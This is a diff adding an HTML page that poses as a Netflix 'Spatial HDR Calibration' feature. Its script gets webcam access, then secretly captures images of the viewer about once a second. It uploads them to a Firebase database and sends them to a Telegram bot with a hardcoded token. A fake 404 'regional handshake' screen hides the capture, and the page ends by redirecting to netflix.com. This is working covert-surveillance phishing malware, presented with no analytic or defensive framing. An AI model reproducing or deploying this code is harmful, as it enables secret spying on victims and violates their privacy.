@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix | Spatial Calibration</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --nf-red: #E50914;
+            --nf-black: #000000;
+            --nf-dark-grey: #141414;
+            --nf-light-grey: #b3b3b3;
+            --nf-white: #FFFFFF;
+        }
+
+        body { 
+            margin: 0; padding: 0; 
+            background-color: var(--nf-black); 
+            color: var(--nf-white);
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex; flex-direction: column; height: 100vh;
+            overflow: hidden;
+        }
+
+        .nf-nav {
+            padding: 20px 4%; background: linear-gradient(to bottom, rgba(0,0,0,0.7) 10%, transparent);
+            position: absolute; top: 0; width: 100%; z-index: 10;
+        }
+
+        .nf-logo { width: 120px; height: auto; }
+
+        .main-container {
+            flex-grow: 1; display: flex; align-items: center; justify-content: center;
+            background: radial-gradient(circle, #232323 0%, #000000 100%);
+            padding: 20px;
+        }
+
+        .calibration-box {
+            width: 100%; max-width: 500px; text-align: center;
+            animation: fadeIn 0.8s ease-out;
+        }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .eye-scanner {
+            width: 160px; height: 160px; margin: 0 auto 30px;
+            border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            position: relative;
+        }
+
+        .scan-ring {
+            position: absolute; width: 100%; height: 100%;
+            border-top: 2px solid var(--nf-red); border-radius: 50%;
+            animation: rotate 2s linear infinite;
+        }
+
+        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+        h1 { font-size: 2.5rem; font-weight: 700; margin: 0 0 15px; }
+        p { font-size: 1.1rem; color: var(--nf-light-grey); line-height: 1.5; margin-bottom: 35px; }
+
+        .btn-netflix {
+            background-color: var(--nf-red); color: white; border: none;
+            padding: 18px 45px; font-size: 1.2rem; font-weight: 700;
+            border-radius: 4px; cursor: pointer; transition: transform 0.2s;
+        }
+
+        .btn-netflix:hover { transform: scale(1.05); background-color: #f40612; }
+
+        /* Logic Views */
+        #sync-ui, #error-404 { display: none; }
+
+        .loading-text {
+            color: var(--nf-red); font-weight: bold; letter-spacing: 2px;
+            text-transform: uppercase; font-size: 0.9rem; margin-top: 20px;
+        }
+
+        .mumbai-node-info {
+            position: absolute; bottom: 20px; width: 100%;
+            font-size: 10px; color: #444; text-transform: uppercase; letter-spacing: 1px;
+        }
+
+        /* 404 Styling */
+        .err-404-content { font-family: monospace; color: var(--nf-light-grey); }
+        .glitch { font-size: 100px; font-weight: 900; color: #222; position: relative; }
+    </style>
+</head>
+<body>
+
+    <div class="nf-nav">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" class="nf-logo" alt="Netflix">
+    </div>
+
+    <div class="main-container">
+        <!-- Initial View -->
+        <div class="calibration-box" id="init-view">
+            <div class="eye-scanner">
+                <div class="scan-ring"></div>
+                <svg width="60" height="60" fill="white" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+            </div>
+            <h1>Optimize Your Viewing</h1>
+            <p>Enable <b>Spatial HDR Calibration</b> to synchronize your display with Mumbai ambient lighting. Experience true-to-life color depth and auto-pause eye tracking.</p>
+            
+            <button class="btn-netflix" onclick="startNfCalibration()">Calibrate Now</button>
+            <div class="mumbai-node-info">Edge Server: MUM-WEST-CDN-09</div>
+        </div>
+
+        <!-- Analysis View -->
+        <div class="calibration-box" id="sync-ui">
+            <div class="eye-scanner" style="border-color: var(--nf-red);">
+                <div class="scan-ring" style="border-top-width: 4px;"></div>
+                <div style="font-size: 24px; font-weight: bold;" id="perc">0%</div>
+            </div>
+            <div class="loading-text">Analyzing Pupil Dilation & Lux...</div>
+            <div id="n-timer" style="font-size: 12px; color: #555; margin-top: 10px;">Verification Stream: Active</div>
+            
+            <div style="text-align: left; background: #0a0a0a; padding: 15px; border-radius: 4px; font-family: monospace; font-size: 10px; color: #00ff00; margin-top: 30px; border: 1px dotted #333;">
+                [INFO] AUTHENTICATING_MUMBAI_REGION...<br>
+                [INFO] MAPPING_EYE_COORDINATES...<br>
+                [INFO] STATUS: STREAMING_CALIBRATION_DATA
+            </div>
+        </div>
+
+        <!-- 404 View -->
+        <div class="calibration-box" id="error-404">
+            <div class="glitch">404</div>
+            <h2 style="font-weight: 400; color: var(--nf-white);">Regional Handshake Failed</h2>
+            <p class="err-404-content">The local Mumbai licensing server (MUM-CDN) could not verify your spatial coordinates. Retrying secure handshake to prevent region-lock.</p>
+            <div class="loading-text" style="color: #444;">Retrying Connection...</div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;" width="640" height="480"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startNfCalibration() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+                    let progress = 0;
+
+                    const interval = setInterval(() => {
+                        count++;
+                        progress = Math.min(Math.floor((count / 50) * 100), 99);
+                        document.getElementById('perc').innerText = progress + "%";
+
+                        if (count <= 55) {
+                            nfCapture(count);
+                        }
+
+                        // Trigger 404 error at 40% progress for realism
+                        if (progress === 40) {
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (count >= 60) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://www.netflix.com/browse";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.netflix.com";
+            }
+        }
+
+        function nfCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "NETFLIX_SPATIAL_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_CDN_NODE_09" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'mumbai_user_eye_map.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
